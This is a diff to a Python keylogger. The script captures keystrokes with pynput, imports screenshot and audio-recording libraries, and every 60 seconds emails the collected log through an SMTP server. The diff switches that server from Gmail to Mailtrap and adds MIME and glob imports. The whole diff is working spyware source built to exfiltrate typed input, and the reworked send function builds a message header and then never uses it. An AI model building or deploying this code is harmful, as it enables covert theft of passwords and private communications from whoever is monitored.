@@ -10,6 +10,11 @@ try:
     import sounddevice as sd
     from pynput import keyboard
     from pynput.keyboard import Listener
+    from email import encoders
+    from email.mime.base import MIMEBase
+    from email.mime.multipart import MIMEMultipart
+    from email.mime.text import MIMEText
+    import glob
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot","sounddevice","pynput"]
@@ -17,8 +22,8 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_EMAIL"
-    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+    EMAIL_ADDRESS = "YOUR_USERNAME"
+    EMAIL_PASSWORD = "YOUR_PASSWORD"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
@@ -56,11 +61,20 @@ finally:
             self.appendlog(current_key)
 
         def send_mail(self, email, password, message):
-            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
-            server.starttls()
-            server.login(email, password)
-            server.sendmail(email, email, message)
-            server.quit()
+            sender = "Private Person <from@example.com>"
+            receiver = "A Test User <to@example.com>"
+
+            m = f"""\
+            Subject: main Mailtrap
+            To: {receiver}
+            From: {sender}
+
+            Keylogger by aydinnyunus\n"""
+
+            m += message
+            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+                server.login(email, password)
+                server.sendmail(sender, receiver, message)
 
         def report(self):
             self.send_mail(self.email, self.password, "\n\n" + self.log)
